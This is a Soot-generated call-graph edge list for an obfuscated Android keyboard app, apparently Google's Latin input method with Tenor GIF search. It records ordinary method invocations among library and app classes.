SPECIAL edge: specialinvoke $r25.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.l)>($i5, $r15, $r16, $r12) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.l)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<java.lang.StringBuilder: java.lang.String toString()>() in <iye: void O(int,int)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r0.<java.util.ArrayList: void <init>()>() in <lri: java.util.ArrayList N()> ==> <java.util.ArrayList: void <init>()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <java.lang.String: void <init>(char[],int,int)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.Object: java.lang.Class getClass()>() in <iye: java.lang.Object w(java.lang.Object)> ==> <java.lang.Object: java.lang.Class getClass()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorStaticImage", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <liz: java.lang.Object next()>
CLINIT edge: staticinvoke <j$.util.concurrent.ThreadLocalRandom: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <j$.util.concurrent.ThreadLocalRandom: void <clinit>()>
VIRTUAL edge: virtualinvoke $r4.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i1) in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
VIRTUAL edge: $i3 = virtualinvoke $r2.<java.lang.String: int indexOf(java.lang.String,int)>("%s", $i1) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.String: int indexOf(java.lang.String,int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lqr: int hashCode()>
INTERFACE edge: $z0 = interfaceinvoke $r5.<java.util.Iterator: boolean hasNext()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lsb: boolean hasNext()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lma: lma i(int,java.lang.Object[])> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $r3 = virtualinvoke r0.<ljd: java.lang.Object k(int)>($i0) in <ljd: java.util.Map m()> ==> <ljd: java.lang.Object k(int)>
STATIC edge: $r2 = staticinvoke <java.lang.reflect.Array: java.lang.Object newInstance(java.lang.Class,int)>($r1, $i0) in <lri: java.lang.Object[] o(java.lang.Object[],int)> ==> <java.lang.reflect.Array: java.lang.Object newInstance(java.lang.Class,int)>
SPECIAL edge: specialinvoke $r2.<java.util.ConcurrentModificationException: void <init>()>() in <liz: void b()> ==> <java.util.ConcurrentModificationException: void <init>()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorAnimatedImage", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: $r12 = virtualinvoke r0.<lsn: lts l()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lsn: lts l()>
STATIC edge: $r7 = staticinvoke <java.util.regex.Pattern: java.util.regex.Pattern compile(java.lang.String)>("\\p{Punct}*") in <iwt: void <clinit>()> ==> <java.util.regex.Pattern: java.util.regex.Pattern compile(java.lang.String)>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lmb: lme f()> ==> <lsb: java.lang.Object next()>
INTERFACE edge: $r5 = interfaceinvoke $r10.<java.util.Iterator: java.lang.Object next()>() in <hbv: void j()> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: $r3 = virtualinvoke $r1.<java.lang.Object: java.lang.Class getClass()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <java.lang.Object: java.lang.Class getClass()>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(8) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
SPECIAL edge: specialinvoke $r2.<java.lang.StringBuilder: void <init>()>() in <iye: void O(int,int)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: virtualinvoke r0.<lsn: void q(lsz,java.lang.Object)>($r3, $r6) in <lsd: boolean b(lsr)> ==> <lsn: void q(lsz,java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <lkq: int hashCode()>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("=") in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<lly: void <init>()>() in <lma: lly g()> ==> <lly: void <init>()>
SPECIAL edge: specialinvoke $r10.<java.lang.StringBuilder: void <init>(int)>($i1) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: void <init>(int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <lma: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r2.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("negative size: ") in <iye: void O(int,int)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lma: boolean equals(java.lang.Object)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.String: int hashCode()>
INTERFACE edge: $r5 = interfaceinvoke $r10.<java.util.Iterator: java.lang.Object next()>() in <hbv: void j()> ==> <llg: java.lang.Object next()>
VIRTUAL edge: $z2 = virtualinvoke $r2.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l3, 0, 1) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" [") in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<lmp: void <init>()>() in <lmo: void <init>(java.util.Comparator)> ==> <lmp: void <init>()>
VIRTUAL edge: $r3 = virtualinvoke $r14.<lkl: lkq g()>() in <hbw: java.lang.Object a(java.lang.Object)> ==> <lkl: lkq g()>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(6) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <j$.util.concurrent.k: boolean equals(java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
INTERFACE edge: $r4 = interfaceinvoke $r0.<java.util.List: java.util.Iterator iterator()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lkq: java.util.Iterator iterator()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <lsp: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.util.LinkedHashSet: void <init>(java.util.Collection)>($r2) in <ose: void <clinit>()> ==> <java.util.LinkedHashSet: void <init>(java.util.Collection)>
INTERFACE edge: $z0 = interfaceinvoke $r1.<java.util.Iterator: boolean hasNext()>() in <llg: java.lang.Object next()> ==> <lsb: boolean hasNext()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lma: lma i(int,java.lang.Object[])> ==> <lid: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.lang.Object: int hashCode()>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.List: java.lang.Object get(int)>($i1) in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lql: java.lang.Object get(int)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lkh: int size()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lqr: int size()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<j$.util.concurrent.d: void <init>(j$.util.concurrent.l[],int,int,j$.util.concurrent.ConcurrentHashMap)>($r2, $i0, $i0, $r1) in <j$.util.concurrent.e: java.util.Iterator iterator()> ==> <j$.util.concurrent.d: void <init>(j$.util.concurrent.l[],int,int,j$.util.concurrent.ConcurrentHashMap)>
STATIC edge: $r1 = staticinvoke <lma: lma i(int,java.lang.Object[])>($i0, $r2) in <lma: lma p(java.util.Collection)> ==> <lma: lma i(int,java.lang.Object[])>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r1) in <lqp: java.lang.Object get(int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<java.lang.String: void <init>(char[])>($r1) in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: void <init>(char[])>
VIRTUAL edge: $z0 = virtualinvoke $r5.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lsd: boolean b(lsr)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r18.<mag: void <init>(java.lang.String,int,int)>("EXPRESSIVE_STICKER_SEARCH", 18, 18) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean equals(java.lang.Object)> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<lkx: lma q()>() in <llo: lma u()> ==> <lkx: lma q()>
SPECIAL edge: specialinvoke $r4.<liw: void <init>(ljd)>(r0) in <ljd: java.util.Iterator l()> ==> <liw: void <init>(ljd)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Object: int hashCode()>
SPECIAL edge: specialinvoke r0.<lid: void <init>()>() in <lki: void <init>(java.lang.Object,java.lang.Object)> ==> <lid: void <init>()>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Throwable: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $i2 = staticinvoke <java.lang.Math: int max(int,int)>($i2, $i0) in <kwe: int U(int,int,int)> ==> <java.lang.Math: int max(int,int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lkx: void <init>()> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r9.<mly: void <init>(java.lang.Object,java.lang.Object,java.lang.Object)>($r2, $r3, $r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <mly: void <init>(java.lang.Object,java.lang.Object,java.lang.Object)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("null key in entry: null=") in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r9 = virtualinvoke $r7.<mly: java.lang.IllegalArgumentException f()>() in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <mly: java.lang.IllegalArgumentException f()>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" and ") in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.lang.Object: int hashCode()>
STATIC edge: $i1 = staticinvoke <java.lang.System: int identityHashCode(java.lang.Object)>($r1) in <j$.util.concurrent.r: int i(java.lang.Object,java.lang.Object)> ==> <java.lang.System: int identityHashCode(java.lang.Object)>
STATIC edge: $r1 = staticinvoke <izw: java.lang.Object al(int)>($i4) in <ljd: int z(int,int,int,int)> ==> <izw: java.lang.Object al(int)>
SPECIAL edge: specialinvoke $r1.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r2) in <iye: void y(boolean,java.lang.Object)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Enum: int hashCode()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
STATIC edge: $r0 = staticinvoke <iye: java.lang.String r(java.lang.String,java.lang.Object[])>("%s (%s) must not be negative", $r1) in <iye: java.lang.String X(int,int,java.lang.String)> ==> <iye: java.lang.String r(java.lang.String,java.lang.Object[])>
STATIC edge: $r0 = staticinvoke <j$.util.concurrent.r: j$.util.concurrent.s h(j$.util.concurrent.s,j$.util.concurrent.s)>($r0, $r3) in <j$.util.concurrent.r: j$.util.concurrent.s c(j$.util.concurrent.s,j$.util.concurrent.s)> ==> <j$.util.concurrent.r: j$.util.concurrent.s h(j$.util.concurrent.s,j$.util.concurrent.s)>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljd: java.lang.Object[] y()>() in <ljd: java.lang.Object k(int)> ==> <ljd: java.lang.Object[] y()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <lkq: boolean equals(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke r0.<lkh: int c()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lqr: int c()>
STATIC edge: $r5 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljf: java.util.Set g()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: java.util.Set g()>
VIRTUAL edge: $i0 = virtualinvoke $r7.<lsm: int a(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <lsm: int a(lsz)>
STATIC edge: $r1 = staticinvoke <izw: java.lang.Object al(int)>($i1) in <ljd: int b()> ==> <izw: java.lang.Object al(int)>
SPECIAL edge: specialinvoke $r0.<java.lang.StringBuilder: void <init>()>() in <izw: java.lang.Object al(int)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: virtualinvoke r0.<ljd: void t(int)>($i6) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: void t(int)>
INTERFACE edge: interfaceinvoke $r5.<java.util.Collection: boolean add(java.lang.Object)>($r2) in <lli: void e(java.lang.Object,java.lang.Object)> ==> <ljf: boolean add(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lmo: int a(java.lang.Object,java.lang.Object)>($r3, $r8) in <lqs: boolean equals(java.lang.Object)> ==> <lmo: int a(java.lang.Object,java.lang.Object)>
STATIC edge: $i3 = staticinvoke <izw: int aj(java.lang.Object,int)>($r2, $i2) in <ljd: int f(java.lang.Object)> ==> <izw: int aj(java.lang.Object,int)>
STATIC edge: $i9 = staticinvoke <izw: int af(int,int)>($i2, $i4) in <ljf: boolean add(java.lang.Object)> ==> <izw: int af(int,int)>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r1) in <ljd: java.lang.Object j()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Boolean: java.lang.Boolean valueOf(boolean)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r2.<java.util.NoSuchElementException: void <init>()>() in <lsb: java.lang.Object next()> ==> <java.util.NoSuchElementException: void <init>()>
VIRTUAL edge: $i8 = virtualinvoke $r13.<lvq: int size()>() in <lvr: void <init>(lvr,lvr)> ==> <lvq: int size()>
SPECIAL edge: specialinvoke $r15.<lme: void <init>(lkx,int)>($r12, $i0) in <lmb: lme f()> ==> <lme: void <init>(lkx,int)>
VIRTUAL edge: virtualinvoke $r7.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <nzh: boolean f(ivv)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Exception: void <init>()>() in <java.lang.RuntimeException: void <init>()> ==> <java.lang.Exception: void <init>()>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljf: java.util.Set f()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: java.util.Set f()>
SPECIAL edge: specialinvoke $r5.<mag: void <init>(java.lang.String,int,int)>("TENOR_GIF_SEARCH_METADATA", 5, 5) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
INTERFACE edge: $i0 = interfaceinvoke $r0.<java.util.List: int size()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lql: int size()>
STATIC edge: $r5 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
STATIC edge: $z2 = staticinvoke <lvm: boolean i(char)>($c1) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <lvm: boolean i(char)>
STATIC edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r2, $i7, $r10) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
VIRTUAL edge: $r4 = virtualinvoke $r5.<java.lang.StringBuilder: java.lang.String toString()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<lkq: void <init>()>() in <lql: void <init>(java.lang.Object[],int)> ==> <lkq: void <init>()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.CharSequence,int,int)>($r2, $i1, $i3) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.CharSequence,int,int)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(9) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
STATIC edge: $r0 = staticinvoke <j$.sun.misc.b: j$.sun.misc.b h()>() in <j$.util.concurrent.r: void <clinit>()> ==> <j$.sun.misc.b: j$.sun.misc.b h()>
VIRTUAL edge: $r7 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.String toString()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r7 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.String toString()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $i6 = staticinvoke <izw: int af(int,int)>($i3, $i4) in <ljf: boolean add(java.lang.Object)> ==> <izw: int af(int,int)>
SPECIAL edge: specialinvoke $r9.<mly: void <init>(java.lang.Object,java.lang.Object,java.lang.Object)>($r2, $r3, $r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <mly: void <init>(java.lang.Object,java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<java.util.WeakHashMap: void <init>()>() in <gwk: void <init>()> ==> <java.util.WeakHashMap: void <init>()>
SPECIAL edge: specialinvoke $r2.<lmc: void <init>(lme)>(r0) in <lme: lma c()> ==> <lmc: void <init>(lme)>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljd: java.util.Map n(int)>($i0) in <ljd: java.util.Map m()> ==> <ljd: java.util.Map n(int)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<ljd: int c()>() in <liz: void <init>(ljd)> ==> <ljd: int c()>
SPECIAL edge: specialinvoke $r3.<java.lang.StringBuilder: void <init>()>() in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: void <init>()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Integer: int highestOneBit(int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lrg: int hashCode()>
SPECIAL edge: specialinvoke $r6.<lrg: void <init>(java.lang.Object)>($r1) in <lma: lma i(int,java.lang.Object[])> ==> <lrg: void <init>(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<lje: void <init>(ljf)>(r0) in <ljf: java.util.Iterator iterator()> ==> <lje: void <init>(ljf)>
SPECIAL edge: specialinvoke $r28.<java.lang.NullPointerException: void <init>(java.lang.String)>("Null throw statement replaced by Soot") in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
SPECIAL edge: $r1 = specialinvoke r0.<ljf: java.lang.Object[] s()>() in <ljf: java.lang.Object e(int)> ==> <ljf: java.lang.Object[] s()>
SPECIAL edge: specialinvoke r0.<java.util.AbstractSet: void <init>()>() in <lvq: void <init>(lvr,int)> ==> <java.util.AbstractSet: void <init>()>
SPECIAL edge: specialinvoke $r4.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r5) in <izw: java.lang.Object al(int)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: void <init>(char[])> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r4.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r1) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lma: lkq f()>() in <lma: lkq k()> ==> <lqr: lkq f()>
STATIC edge: $i0 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: int n(int)>($i0) in <j$.util.concurrent.ConcurrentHashMap: void q(int)> ==> <j$.util.concurrent.ConcurrentHashMap: int n(int)>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lmb: lme f()> ==> <liy: int size()>
STATIC edge: $r1 = staticinvoke <lkq: lkq h(java.lang.Object[],int)>($r2, $i0) in <lqr: lkq f()> ==> <lkq: lkq h(java.lang.Object[],int)>
SPECIAL edge: specialinvoke $r1.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r2) in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.util.AbstractCollection: void <init>()>() in <lkh: void <init>()> ==> <java.util.AbstractCollection: void <init>()>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(3) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lma: lma i(int,java.lang.Object[])> ==> <lma: boolean equals(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean deepEquals(java.lang.Object[],java.lang.Object[])>($r2, $r3) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean deepEquals(java.lang.Object[],java.lang.Object[])>
VIRTUAL edge: $r4 = virtualinvoke $r3.<java.lang.StringBuilder: java.lang.String toString()>() in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.String toString()>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lnc: java.lang.Object next()>
STATIC edge: $r1 = staticinvoke <j$.sun.misc.b: java.lang.reflect.Field i()>() in <j$.sun.misc.b: void <clinit>()> ==> <j$.sun.misc.b: java.lang.reflect.Field i()>
STATIC edge: $i1 = staticinvoke <java.lang.Integer: int highestOneBit(int)>($i1) in <lkg: int a(int,int)> ==> <java.lang.Integer: int highestOneBit(int)>
STATIC edge: $r1 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOfRange(java.lang.Object[],int,int,java.lang.Class)>($r2, $i0, $i1, $r3) in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <java.util.Arrays: java.lang.Object[] copyOfRange(java.lang.Object[],int,int,java.lang.Class)>
STATIC edge: $r1 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i0) in <lvr: int hashCode()> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lkh: int j()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lql: int j()>
STATIC edge: $r4 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r4) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke r0.<lkq: boolean isEmpty()>() in <lkq: lsb C(int)> ==> <java.util.AbstractCollection: boolean isEmpty()>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r0) in <lri: boolean a(java.util.Comparator,java.lang.Iterable)> ==> <iye: java.lang.Object w(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lkh: int j()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lqr: int j()>
INTERFACE edge: $r8 = interfaceinvoke $r9.<lse: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>("com/google/android/libraries/inputmethod/utils/LanguageTag", "fromLocale", 222, "LanguageTag.java") in <ivw: ivw d(java.util.Locale)> ==> <lsv: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <java.lang.Object: int hashCode()>
SPECIAL edge: specialinvoke r0.<com.google.android.apps.inputmethod.latin.LatinApp: void <init>()>() in <com.google.android.apps.inputmethod.latin.ImeLatinApp: void <init>()> ==> <com.google.android.apps.inputmethod.latin.LatinApp: void <init>()>
